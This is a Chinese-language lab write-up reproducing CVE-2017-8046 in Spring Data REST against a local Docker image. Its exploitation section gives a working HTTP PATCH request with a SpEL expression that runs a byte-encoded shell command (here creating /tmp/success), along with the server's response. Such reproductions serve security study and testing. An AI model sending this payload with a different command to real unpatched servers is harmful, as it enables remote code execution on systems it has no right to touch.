# Java框架漏洞 Spring-Data-REST复现 [CVE-2017-8046]

## 漏洞简介

Spring Data REST对PATCH方法处理不当，导致攻击者能够利用JSON数据造成RCE。本质还是因为spring的SPEL解析导致的RCE

## 科普

HTTP-PATCH 

必须指定Content-Type指定为application/json-patch+json

请求数据必须是json数组

## 部署环境

docker pull registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest

docker run -d -p 0.0.0.0:80:8080 registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest

直接部署在本地,用浏览器打开即可

## 测试

curl -X POST -H "Content-Type: application/json-patch+json" -d '{"forstname":"si","lastname":"li"}' http://127.0.0.1/customers

```json
{
  "firstname" : null,
  "lastname" : "li",
  "gender" : null,
  "address" : null,
  "_links" : {
    "self" : {
      "href" : "http://127.0.0.1/customers/2"
    },
    "customer" : {
      "href" : "http://127.0.0.1/customers/2"
    }
  }
}%
```

随后执行删除

curl -X DELETE -H "Content-Type: application/json-patch+json" http://127.0.0.1/customers/2

查看网页已经被成功删除

## 利用

我们准备在服务器内tmp路径中创建success文件

首先进入容器

docker exec -it 容器编号 /bin/bash

cd /tmp

ls

发现没有success文件

使用BurpSuite本地抓包

```
GET /customers/1 HTTP/1.1
Host: 192.168.0.108
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: security_level=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

修改为
```
PATCH /customers/1 HTTP/1.1
Host: 192.168.0.108
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: security_level=0
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 08 Sep 2020 03:06:31 GMT
If-None-Match: "0"
Cache-Control: max-age=0
Content-Type: application/json-patch+json

[{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname","value":"test"}]

```

此时可以获得响应

```json
{
  "cause": {
    "cause": null,
    "message": "EL1010E: Property or field 'lastname' cannot be set on object of type 'java.lang.UNIXProcess' - maybe not public?"
  },
  "message": "Could not read an object of type class example.springdata.rest.headers.Customer from the request!; nested exception is org.springframework.expression.spel.SpelEvaluationException: EL1010E: Property or field 'lastname' cannot be set on object of type 'java.lang.UNIXProcess' - maybe not public?"
}
```

随后进入docker容器中进行查看发现在 /tmp 路径下已经成功创建文件success

至此完成初级漏洞利用

## 最后

20201014 : 暂时封存,最近记忆有点断片
